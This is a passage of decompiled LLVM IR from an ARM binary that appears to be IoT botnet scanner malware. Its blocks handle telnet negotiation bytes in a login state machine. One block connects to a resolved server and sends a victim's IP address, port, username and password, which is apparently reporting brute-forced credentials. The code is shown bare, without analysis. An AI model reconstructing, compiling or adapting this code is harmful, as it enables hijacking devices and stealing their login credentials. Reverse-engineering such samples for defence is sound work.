  br i1 %v3_ff10, label %dec_label_pc_fed0.dec_label_pc_f8e8.loopexit_crit_edge, label %dec_label_pc_ff14

dec_label_pc_fed0.dec_label_pc_f8e8.loopexit_crit_edge: ; preds = %dec_label_pc_fed0
  %v0_f8e8.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f8e8

dec_label_pc_ff14:                                ; preds = %dec_label_pc_fed0
  %v2_ff14 = inttoptr i32 %v1_ff04 to i8*
  %v3_ff14 = load i8, i8* %v2_ff14, align 1
  %v4_ff14 = zext i8 %v3_ff14 to i32
  store i32 %v4_ff14, i32* %r3.global-to-local, align 4
  %v2_ff18 = icmp ugt i8 %v3_ff14, 30
  store i1 %v2_ff18, i1* %cpsr_c.global-to-local, align 1
  %v7_ff18 = icmp eq i8 %v3_ff14, 31
  store i1 %v7_ff18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff18, label %dec_label_pc_ffe4, label %dec_label_pc_ff20

dec_label_pc_ff20:                                ; preds = %dec_label_pc_ff14
  %v1_ff20 = inttoptr i32 %v0_ff04 to i8*
  %v2_ff20 = load i8, i8* %v1_ff20, align 1
  %v3_ff20 = zext i8 %v2_ff20 to i32
  store i32 %v3_ff20, i32* %r3.global-to-local, align 4
  %v2_ff24 = icmp ugt i8 %v2_ff20, -4
  store i1 %v2_ff24, i1* %cpsr_c.global-to-local, align 1
  %v7_ff24 = icmp eq i8 %v2_ff20, -3
  store i1 %v7_ff24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff24, label %.thread145, label %dec_label_pc_ff34

.thread145:                                       ; preds = %dec_label_pc_ff20
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_ff20, align 1
  %v0_ff30.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ff30.pr.pr, label %dec_label_pc_f880, label %.thread145.dec_label_pc_ff34thread-pre-split_crit_edge

.thread145.dec_label_pc_ff34thread-pre-split_crit_edge: ; preds = %.thread145
  %v0_ff34.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ff34

dec_label_pc_ff34:                                ; preds = %dec_label_pc_ff20, %.thread145.dec_label_pc_ff34thread-pre-split_crit_edge
  %v0_ff34.pr = phi i32 [ %v0_ff34.pr.pre, %.thread145.dec_label_pc_ff34thread-pre-split_crit_edge ], [ %v3_ff20, %dec_label_pc_ff20 ]
  %v2_ff34 = icmp ugt i32 %v0_ff34.pr, 250
  store i1 %v2_ff34, i1* %cpsr_c.global-to-local, align 1
  %v7_ff34 = icmp eq i32 %v0_ff34.pr, 251
  store i1 %v7_ff34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff34, label %bb459, label %dec_label_pc_f880

bb459:                                            ; preds = %dec_label_pc_ff34
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_ff3c = load i32, i32* @r4, align 4
  %v4_ff3c = inttoptr i32 %v3_ff3c to i8*
  store i8 -3, i8* %v4_ff3c, align 1
  br label %dec_label_pc_f880

dec_label_pc_ff44:                                ; preds = %dec_label_pc_fdf8, %dec_label_pc_fe18, %dec_label_pc_fe10, %dec_label_pc_fe08, %bb457, %dec_label_pc_fde4, %dec_label_pc_fdc0, %dec_label_pc_fddc, %dec_label_pc_fdd4, %bb456
  %v0_ff48 = phi i32 [ %v1_fdb4, %dec_label_pc_fde4 ], [ %v1_fdb4, %dec_label_pc_fdc0 ], [ %v1_fdb4, %dec_label_pc_fddc ], [ %v1_fdb4, %dec_label_pc_fdd4 ], [ %v1_fdb4, %bb456 ], [ %v1_fe24, %bb457 ], [ %v1_fe24, %dec_label_pc_fe08 ], [ %v1_fe24, %dec_label_pc_fe10 ], [ %v1_fe24, %dec_label_pc_fe18 ], [ %v1_fe24, %dec_label_pc_fdf8 ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_ff48 = add i32 %v0_ff48, 1
  store i32 %v1_ff48, i32* @r8, align 4
  %v1_ff4c = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_ff54 = call i32 @table_lock_val(i32 27)
  store i32 %v1_ff54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ff58

dec_label_pc_ff58:                                ; preds = %dec_label_pc_feb4, %dec_label_pc_ff44
  %v0_ff58 = load i32, i32* @r6, align 4
  %v1_ff58 = inttoptr i32 %v0_ff58 to i32*
  %v2_ff58 = load i32, i32* %v1_ff58, align 4
  store i32 %v2_ff58, i32* %r3.global-to-local, align 4
  %v1_ff5c = add i32 %v0_ff58, 4
  %v2_ff5c = inttoptr i32 %v1_ff5c to i32*
  %v3_ff5c = load i32, i32* %v2_ff5c, align 4
  store i32 %v3_ff5c, i32* %r0.global-to-local, align 4
  %v1_ff60 = add i32 %v2_ff58, 12
  %v2_ff60 = inttoptr i32 %v1_ff60 to i8*
  %v3_ff60 = load i8, i8* %v2_ff60, align 1
  %v4_ff60 = zext i8 %v3_ff60 to i32
  store i32 %v4_ff60, i32* %r2.global-to-local, align 4
  %v1_ff64 = inttoptr i32 %v2_ff58 to i32*
  %v2_ff64 = load i32, i32* %v1_ff64, align 4
  store i32 %v2_ff64, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ff6c = call i32 @__libc_send(i32 %v3_ff5c, i32 %v2_ff64, i32 %v4_ff60, i32 16384)
  store i32 %v4_ff6c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ff74 = load i32, i32* @r6, align 4
  %v1_ff74 = add i32 %v0_ff74, 4
  %v2_ff74 = inttoptr i32 %v1_ff74 to i32*
  %v3_ff74 = load i32, i32* %v2_ff74, align 4
  store i32 %v3_ff74, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_ff80 = call i32 @__libc_send(i32 %v3_ff74, i32 ptrtoint ([3 x i8]* @global_var_197a8.208 to i32), i32 2, i32 16384)
  store i32 %v4_ff80, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_ff88 = load i32, i32* @r6, align 4
  %v2_ff88 = add i32 %v1_ff88, 12
  %v3_ff88 = inttoptr i32 %v2_ff88 to i32*
  store i32 4, i32* %v3_ff88, align 4
  br label %dec_label_pc_f724

dec_label_pc_ff90:                                ; preds = %dec_label_pc_fc30, %dec_label_pc_fc48, %dec_label_pc_fc40, %bb451, %dec_label_pc_fc1c, %dec_label_pc_fc00, %dec_label_pc_fc14, %bb450
  %v0_ff94 = phi i32 [ %v1_fbf4, %dec_label_pc_fc1c ], [ %v1_fbf4, %dec_label_pc_fc00 ], [ %v1_fbf4, %dec_label_pc_fc14 ], [ %v1_fbf4, %bb450 ], [ %v1_fc54, %bb451 ], [ %v1_fc54, %dec_label_pc_fc40 ], [ %v1_fc54, %dec_label_pc_fc48 ], [ %v1_fc54, %dec_label_pc_fc30 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_ff94 = add i32 %v0_ff94, 1
  store i32 %v1_ff94, i32* @r8, align 4
  %v1_ff98 = call i32 @table_lock_val(i32 25)
  br label %dec_label_pc_fca4

dec_label_pc_ffa0:                                ; preds = %dec_label_pc_f5e0
  store i32 %v1_f61c, i32* %r0.global-to-local, align 4
  %v0_ffa8 = load i32, i32* @r6, align 4
  %v1_ffa8 = add i32 %v0_ffa8, 4
  %v2_ffa8 = inttoptr i32 %v1_ffa8 to i32*
  %v3_ffa8 = load i32, i32* %v2_ffa8, align 4
  store i32 %v3_ffa8, i32* %r0.global-to-local, align 4
  %v1_ffac = call i32 @__GI___libc_close(i32 %v3_ffa8)
  store i32 %v1_ffac, i32* %r0.global-to-local, align 4
  %v0_ffb0 = load i32, i32* @r6, align 4
  %v1_ffb0 = add i32 %v0_ffb0, 284
  %v2_ffb0 = inttoptr i32 %v1_ffb0 to i8*
  %v3_ffb0 = load i8, i8* %v2_ffb0, align 1
  %v4_ffb0 = zext i8 %v3_ffb0 to i32
  %v1_ffb4 = add nuw nsw i32 %v4_ffb0, 1
  %v1_ffb8 = urem i32 %v1_ffb4, 256
  store i32 %v1_ffb8, i32* @r3, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ffc0 = icmp ugt i32 %v1_ffb8, 9
  store i1 %v2_ffc0, i1* %cpsr_c.global-to-local, align 1
  %v7_ffc0 = icmp eq i32 %v1_ffb8, 10
  store i1 %v7_ffc0, i1* %cpsr_z.global-to-local, align 1
  %v2_ffc4 = add i32 %v0_ffb0, 4
  %v3_ffc4 = inttoptr i32 %v2_ffc4 to i32*
  store i32 -1, i32* %v3_ffc4, align 4
  %v0_ffc8 = load i32, i32* @r3, align 4
  %v1_ffc8 = trunc i32 %v0_ffc8 to i8
  %v2_ffc8 = load i32, i32* @r6, align 4
  %v3_ffc8 = add i32 %v2_ffc8, 284
  %v4_ffc8 = inttoptr i32 %v3_ffc8 to i8*
  store i8 %v1_ffc8, i8* %v4_ffc8, align 1
  %v0_ffcc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ffcc, label %dec_label_pc_ffd0, label %dec_label_pc_1002c

dec_label_pc_ffd0:                                ; preds = %dec_label_pc_ffa0
  store i32 0, i32* @r3, align 4
  store i32 -1, i32* @r8, align 4
  %v1_ffd8 = load i32, i32* @r6, align 4
  %v2_ffd8 = add i32 %v1_ffd8, 12
  %v3_ffd8 = inttoptr i32 %v2_ffd8 to i32*
  store i32 0, i32* %v3_ffd8, align 4
  %v0_ffdc = load i32, i32* @r3, align 4
  %v1_ffdc = trunc i32 %v0_ffdc to i8
  %v2_ffdc = load i32, i32* @r6, align 4
  %v3_ffdc = add i32 %v2_ffdc, 284
  %v4_ffdc = inttoptr i32 %v3_ffdc to i8*
  store i8 %v1_ffdc, i8* %v4_ffdc, align 1
  br label %dec_label_pc_f72c

dec_label_pc_ffe4:                                ; preds = %dec_label_pc_ff14
  store i32 %v2_fed4, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_fff0 = add i32 %v0_ff00, 4
  %v2_fff0 = inttoptr i32 %v1_fff0 to i32*
  %v3_fff0 = load i32, i32* %v2_fff0, align 4
  store i32 %v3_fff0, i32* %r0.global-to-local, align 4
  %v4_fff4 = call i32 @__libc_send(i32 %v3_fff0, i32 %v2_fed4, i32 3, i32 16384)
  store i32 %v4_fff4, i32* %r0.global-to-local, align 4
  %v0_fff8 = load i32, i32* @r6, align 4
  %v1_fff8 = add i32 %v0_fff8, 4
  %v2_fff8 = inttoptr i32 %v1_fff8 to i32*
  %v3_fff8 = load i32, i32* %v2_fff8, align 4
  store i32 %v3_fff8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f8cc

dec_label_pc_10008:                               ; preds = %dec_label_pc_f4c4
  store i32 %.pre, i32* @r0, align 4
  %v1_10010 = add i32 %v0_10008, 92
  store i32 %v1_10010, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_10018 = call i32 @memmove(i32 %.pre, i32 %v1_10010, i32 192)
  store i32 %v3_10018, i32* %r0.global-to-local, align 4
  %v0_1001c = load i32, i32* @r6, align 4
  %v1_1001c = add i32 %v0_1001c, 24
  %v2_1001c = inttoptr i32 %v1_1001c to i32*
  %v3_1001c = load i32, i32* %v2_1001c, align 4
  %v1_10020 = add i32 %v3_1001c, -64
  store i32 %v1_10020, i32* %r3.global-to-local, align 4
  store i32 %v1_10020, i32* %v2_1001c, align 4
  br label %dec_label_pc_f4d4

dec_label_pc_1002c:                               ; preds = %dec_label_pc_ffa0
  %v0_1002c = load i32, i32* @r6, align 4
  store i32 %v0_1002c, i32* @r0, align 4
  %v0_10030 = call i32 @setup_connection()
  store i32 %v0_10030, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r8, align 4
  br label %dec_label_pc_f72c

dec_label_pc_1003c:                               ; preds = %dec_label_pc_f47c
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_ebe8, i32* %r3.global-to-local, align 4
  store i32 %v2_fe40, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* @r1, align 4
  store i32 0, i32* %stack_var_-56, align 4
  %v5_10064 = call i32 @getsockopt(i32 %v3_f470, i32 1, i32 4, i32 %v2_ebe8, i32 %v2_fe40)
  %v3_10068 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10068, i32* %r3.global-to-local, align 4
  %v2_1006c = or i32 %v3_10068, %v5_10064
  store i32 %v2_1006c, i32* %r0.global-to-local, align 4
  %v4_1006c = icmp eq i32 %v2_1006c, 0
  store i1 %v4_1006c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_1006c, label %dec_label_pc_10074, label %dec_label_pc_10100

dec_label_pc_10074:                               ; preds = %dec_label_pc_1003c
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_10078 = load i32, i32* @r6, align 4
  %v2_10078 = add i32 %v1_10078, 12
  %v3_10078 = inttoptr i32 %v2_10078 to i32*
  store i32 2, i32* %v3_10078, align 4
  %v0_1007c = call i32 @rand_next()
  %v2_10084 = load i16, i16* bitcast (i16** @global_var_22280.146 to i16*), align 4
  %v3_10084 = zext i16 %v2_10084 to i32
  %v2_10088 = udiv i32 %v0_1007c, %v3_10084
  %v3_10088 = urem i32 %v0_1007c, %v3_10084
  store i32 %v2_10088, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22250.142 to i32), i32* %r3.global-to-local, align 4
  %v2_10090 = load i32, i32* @global_var_22250.142, align 4
  store i32 %v2_10090, i32* %ip.global-to-local, align 4
  %v1_10098 = load i32, i32* @r4, align 4
  %v9_10098 = icmp eq i32 %v2_10090, %v1_10098
  store i1 %v9_10098, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_10088, i32* %r1.global-to-local, align 4
  %v7_100a0 = icmp sgt i32 %v2_10090, %v1_10098
  br i1 %v7_100a0, label %dec_label_pc_100a4, label %dec_label_pc_100dc

dec_label_pc_100a4:                               ; preds = %dec_label_pc_10074
  %v2_100a8 = load i32, i32* @global_var_2227c.144, align 4
  store i32 %v2_100a8, i32* %r3.global-to-local, align 4
  store i32 %v1_10098, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_100b0

dec_label_pc_100b0:                               ; preds = %dec_label_pc_100cc, %dec_label_pc_100a4
  %v0_100cc = phi i32 [ %v1_100cc, %dec_label_pc_100cc ], [ %v1_10098, %dec_label_pc_100a4 ]
  %v0_100d4 = phi i32 [ %v1_100d4, %dec_label_pc_100cc ], [ %v2_100a8, %dec_label_pc_100a4 ]
  store i32 %v0_100d4, i32* %r0.global-to-local, align 4
  %v1_100b4 = add i32 %v0_100d4, 8
  %v2_100b4 = inttoptr i32 %v1_100b4 to i16*
  %v3_100b4 = load i16, i16* %v2_100b4, align 2
  %v4_100b4 = zext i16 %v3_100b4 to i32
  store i32 %v4_100b4, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i32 %v4_100b4, %v3_10088
  br i1 %tmp460, label %dec_label_pc_100cc, label %dec_label_pc_100c0

dec_label_pc_100c0:                               ; preds = %dec_label_pc_100b0
  %v1_100c0 = add i32 %v0_100d4, 10
  %v2_100c0 = inttoptr i32 %v1_100c0 to i16*
  %v3_100c0 = load i16, i16* %v2_100c0, align 2
  %v4_100c0 = zext i16 %v3_100c0 to i32
  store i32 %v4_100c0, i32* %r3.global-to-local, align 4
  %v3_100c4 = icmp uge i32 %v4_100c0, %v3_10088
  %v9_100c4 = icmp eq i32 %v4_100c0, %v3_10088
  %v2_100c8 = xor i1 %v9_100c4, true
  %v3_100c8 = and i1 %v3_100c4, %v2_100c8
  br i1 %v3_100c8, label %dec_label_pc_100e0.loopexit, label %dec_label_pc_100cc

dec_label_pc_100cc:                               ; preds = %dec_label_pc_100c0, %dec_label_pc_100b0
  %v1_100cc = add i32 %v0_100cc, 1
  store i32 %v1_100cc, i32* %r2.global-to-local, align 4
  %v9_100d0 = icmp eq i32 %v1_100cc, %v2_10090
  %v1_100d4 = add i32 %v0_100d4, 16
  store i32 %v1_100d4, i32* %r3.global-to-local, align 4
  br i1 %v9_100d0, label %dec_label_pc_100dc.loopexit, label %dec_label_pc_100b0

dec_label_pc_100dc.loopexit:                      ; preds = %dec_label_pc_100cc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_100dc

dec_label_pc_100dc:                               ; preds = %dec_label_pc_100dc.loopexit, %dec_label_pc_10074
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100e0

dec_label_pc_100e0.loopexit:                      ; preds = %dec_label_pc_100c0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v9_100c4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_100e0

dec_label_pc_100e0:                               ; preds = %dec_label_pc_100e0.loopexit, %dec_label_pc_100dc
  %v0_100f4 = phi i32 [ %v0_100d4, %dec_label_pc_100e0.loopexit ], [ 0, %dec_label_pc_100dc ]
  %v0_100e0 = load i32, i32* @r6, align 4
  %v1_100e0 = add i32 %v0_100e0, 4
  %v2_100e0 = inttoptr i32 %v1_100e0 to i32*
  %v3_100e0 = load i32, i32* %v2_100e0, align 4
  %v3_100e4 = udiv i32 %v3_100e0, 32
  store i32 %v3_100e4, i32* %r2.global-to-local, align 4
  %v1_100e8 = urem i32 %v3_100e0, 32
  store i32 %v1_100e8, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_100ec = mul nuw nsw i32 %v3_100e4, 4
  store i32 %v3_100ec, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_100f4 = inttoptr i32 %v0_100e0 to i32*
  store i32 %v0_100f4, i32* %v2_100f4, align 4
  %v0_100f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_100f8 = load i32, i32* @r6, align 4
  %v2_100f8 = add i32 %v1_100f8, 24
  %v3_100f8 = inttoptr i32 %v2_100f8 to i32*
  store i32 %v0_100f8, i32* %v3_100f8, align 4
  %v0_f4a4.pre = load i32, i32* @ip, align 4
  %v1_f4ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_f4a0

dec_label_pc_10100:                               ; preds = %dec_label_pc_1003c
  %v0_10100 = load i32, i32* @r6, align 4
  %v1_10100 = add i32 %v0_10100, 4
  %v2_10100 = inttoptr i32 %v1_10100 to i32*
  %v3_10100 = load i32, i32* %v2_10100, align 4
  store i32 %v3_10100, i32* %r0.global-to-local, align 4
  %v1_10104 = call i32 @__GI___libc_close(i32 %v3_10100)
  store i32 %v1_10104, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_1010c = load i32, i32* @r4, align 4
  %v1_1010c = load i32, i32* @r6, align 4
  %v2_1010c = add i32 %v1_1010c, 12
  %v3_1010c = inttoptr i32 %v2_1010c to i32*
  store i32 %v0_1010c, i32* %v3_1010c, align 4
  %v0_10110 = load i32, i32* %r3.global-to-local, align 4
  %v1_10110 = load i32, i32* @r6, align 4
  %v2_10110 = add i32 %v1_10110, 4
  %v3_10110 = inttoptr i32 %v2_10110 to i32*
  store i32 %v0_10110, i32* %v3_10110, align 4
  %v0_10114 = load i32, i32* @r4, align 4
  %v1_10114 = trunc i32 %v0_10114 to i8
  %v2_10114 = load i32, i32* @r6, align 4
  %v3_10114 = add i32 %v2_10114, 284
  %v4_10114 = inttoptr i32 %v3_10114 to i8*
  store i8 %v1_10114, i8* %v4_10114, align 1
  br label %dec_label_pc_f5c8

dec_label_pc_1011c:                               ; preds = %dec_label_pc_f6c4
  store i32 2, i32* @lr, align 4
  store i32 %v2_f674, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v1_10128 = add i32 %v2_f6d0, 4
  %v2_10128 = inttoptr i32 %v1_10128 to i32*
  %v3_10128 = load i32, i32* %v2_10128, align 4
  store i32 %v3_10128, i32* @r4, align 4
  %v0_1012c = call i32 @rand_next()
  store i32 %v0_1012c, i32* %r0.global-to-local, align 4
  %v0_10130 = load i32, i32* @r7, align 4
  %v1_10130 = inttoptr i32 %v0_10130 to i8*
  %v2_10130 = load i8, i8* %v1_10130, align 1
  %v3_10130 = zext i8 %v2_10130 to i32
  %v2_10134 = udiv i32 %v0_1012c, %v3_10130
  %v3_10134 = urem i32 %v0_1012c, %v3_10130
  store i32 %v2_10134, i32* %r0.global-to-local, align 4
  store i32 %v3_10134, i32* %r1.global-to-local, align 4
  %v0_10138 = load i32, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_10138 = mul nuw nsw i32 %v3_10134, 4
  %v5_10138 = add i32 %v0_10138, %v4_10138
  %v6_10138 = inttoptr i32 %v5_10138 to i32*
  %v7_10138 = load i32, i32* %v6_10138, align 4
  store i32 %v7_10138, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10140 = load i32, i32* @sl, align 4
  store i32 %v0_10140, i32* %r1.global-to-local, align 4
  %v2_10148 = inttoptr i32 %v0_10140 to i32*
  %v3_10148 = call i32 @table_retrieve_val(i32 2, i32* %v2_10148)
  store i32 %v2_f674, i32* %r1.global-to-local, align 4
  %v0_10158 = load i32, i32* @r7, align 4
  store i32 %v0_10158, i32* %r0.global-to-local, align 4
  %v2_1015c = call i32 @resolv_entries_free(i32 %v0_10158, i32 %v2_f674)
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10164 = call i32 @table_lock_val(i32 2)
  %v0_1016c = load i32, i32* @r5, align 4
  store i32 %v0_1016c, i32* %r0.global-to-local, align 4
  store i32 %v2_10170, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_10178 = call i32 @__libc_connect(i32 %v0_1016c, i32 %v2_10170, i32 16)
  store i32 %v3_10178, i32* %r0.global-to-local, align 4
  %v3_1017c = icmp eq i32 %v3_10178, -1
  store i1 %v3_1017c, i1* %cpsr_c.global-to-local, align 1
  %v8_1017c = icmp eq i32 %v3_10178, -1
  store i1 %v8_1017c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1017c, label %dec_label_pc_10184, label %dec_label_pc_10194

dec_label_pc_10184:                               ; preds = %dec_label_pc_1011c
  %v0_10184 = load i32, i32* @r5, align 4
  store i32 %v0_10184, i32* %r0.global-to-local, align 4
  %v1_10188 = call i32 @__GI___libc_close(i32 %v0_10184)
  %v0_1018c = load i32, i32* @sl, align 4
  store i32 %v0_1018c, i32* %r0.global-to-local, align 4
  %v1_10190 = call i32 @__GI_exit(i32 %v0_1018c)
  store i32 %v1_10190, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10194

dec_label_pc_10194:                               ; preds = %dec_label_pc_1011c, %dec_label_pc_10184
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v2_ebe8, i32* %r1.global-to-local, align 4
  %v0_101a0 = load i32, i32* @r5, align 4
  store i32 %v0_101a0, i32* %r0.global-to-local, align 4
  %v0_101a4 = load i32, i32* @sl, align 4
  store i32 %v0_101a4, i32* %stack_var_-56, align 4
  %v5_101a8 = call i32 @__libc_send(i32 %v0_101a0, i32 %v2_ebe8, i32 1, i32 16384)
  store i32 %v2_fe40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_101bc = load i32, i32* @r5, align 4
  store i32 %v0_101bc, i32* %r0.global-to-local, align 4
  %v4_101c0 = call i32 @__libc_send(i32 %v0_101bc, i32 %v2_fe40, i32 4, i32 16384)
  store i32 %v2_101c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_101d4 = load i32, i32* @r5, align 4
  store i32 %v0_101d4, i32* %r0.global-to-local, align 4
  %v4_101d8 = call i32 @__libc_send(i32 %v0_101d4, i32 %v2_101c8, i32 2, i32 16384)
  %v0_101dc = load i32, i32* @sb, align 4
  %v1_101dc = add i32 %v0_101dc, 12
  store i32 %v1_101dc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_101e8 = load i32, i32* @r5, align 4
  store i32 %v0_101e8, i32* %r0.global-to-local, align 4
  %v4_101ec = call i32 @__libc_send(i32 %v0_101e8, i32 %v1_101dc, i32 1, i32 16384)
  store i32 %v4_101ec, i32* %r0.global-to-local, align 4
  %v0_101f0 = load i32, i32* @sb, align 4
  %v1_101f0 = inttoptr i32 %v0_101f0 to i32*
  %v2_101f0 = load i32, i32* %v1_101f0, align 4
  store i32 %v2_101f0, i32* %r1.global-to-local, align 4
  %v1_101f4 = add i32 %v0_101f0, 12
  %v2_101f4 = inttoptr i32 %v1_101f4 to i8*
  %v3_101f4 = load i8, i8* %v2_101f4, align 1
  %v4_101f4 = zext i8 %v3_101f4 to i32
  store i32 %v4_101f4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_101fc = load i32, i32* @r5, align 4
  store i32 %v0_101fc, i32* %r0.global-to-local, align 4
  %v4_10200 = call i32 @__libc_send(i32 %v0_101fc, i32 %v2_101f0, i32 %v4_101f4, i32 16384)
  %v0_10204 = load i32, i32* @sb, align 4
  %v1_10204 = add i32 %v0_10204, 13
  store i32 %v1_10204, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10210 = load i32, i32* @r5, align 4
  store i32 %v0_10210, i32* %r0.global-to-local, align 4
  %v4_10214 = call i32 @__libc_send(i32 %v0_10210, i32 %v1_10204, i32 1, i32 16384)
  %v0_10218 = load i32, i32* @r5, align 4
  store i32 %v0_10218, i32* %r0.global-to-local, align 4
  %v0_1021c = load i32, i32* @sb, align 4
  %v1_1021c = add i32 %v0_1021c, 13
  %v2_1021c = inttoptr i32 %v1_1021c to i8*
  %v3_1021c = load i8, i8* %v2_1021c, align 1
  %v4_1021c = zext i8 %v3_1021c to i32
  store i32 %v4_1021c, i32* %r2.global-to-local, align 4
  %v1_10220 = add i32 %v0_1021c, 4
  %v2_10220 = inttoptr i32 %v1_10220 to i32*
  %v3_10220 = load i32, i32* %v2_10220, align 4
  store i32 %v3_10220, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10228 = call i32 @__libc_send(i32 %v0_10218, i32 %v3_10220, i32 %v4_1021c, i32 16384)
  %v0_1022c = load i32, i32* @r5, align 4
  store i32 %v0_1022c, i32* %r0.global-to-local, align 4
  %v1_10230 = call i32 @__GI___libc_close(i32 %v0_1022c)
  store i32 %v1_10230, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10234

dec_label_pc_10234:                               ; preds = %dec_label_pc_f6a8, %dec_label_pc_10194
  %v0_10234 = load i32, i32* @sl, align 4
  store i32 %v0_10234, i32* %r0.global-to-local, align 4
  %v1_10238 = call i32 @__GI_exit(i32 %v0_10234)
  store i32 %v1_10238, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1023c

dec_label_pc_1023c.loopexit:                      ; preds = %dec_label_pc_fc5c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1023c

dec_label_pc_1023c:                               ; preds = %dec_label_pc_1023c.loopexit, %dec_label_pc_10234
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_10240 = call i32 @table_lock_val(i32 25)
  store i32 %v1_10240, i32* %r0.global-to-local, align 4
  %v0_10244 = load i32, i32* @r6, align 4
  %v1_10244 = add i32 %v0_10244, 12
  %v2_10244 = inttoptr i32 %v1_10244 to i32*
  %v3_10244 = load i32, i32* %v2_10244, align 4
  store i32 %v3_10244, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f4bc.backedge

dec_label_pc_f4bc.backedge.thread:                ; preds = %dec_label_pc_f754, %dec_label_pc_f8f8, %dec_label_pc_f9cc, %dec_label_pc_fb1c, %dec_label_pc_fcdc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4c4

dec_label_pc_f4bc.backedge.thread565:             ; preds = %dec_label_pc_fa30, %dec_label_pc_f95c, %dec_label_pc_fd40, %dec_label_pc_fb80, %dec_label_pc_f7b8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f4c4

dec_label_pc_f4bc.backedge:                       ; preds = %dec_label_pc_f53c, %dec_label_pc_1023c, %dec_label_pc_1024c
  %v0_f4c4232 = phi i32 [ %v0_1025c, %dec_label_pc_1024c ], [ %v0_10244, %dec_label_pc_1023c ], [ %v0_f53c, %dec_label_pc_f53c ]
  %v0_f4bc.be = phi i32 [ %v3_1025c, %dec_label_pc_1024c ], [ %v3_10244, %dec_label_pc_1023c ], [ %v3_f53c, %dec_label_pc_f53c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f4bc = icmp eq i32 %v0_f4bc.be, 0
  store i1 %v2_f4bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f4bc, label %dec_label_pc_f5c8, label %dec_label_pc_f4c4

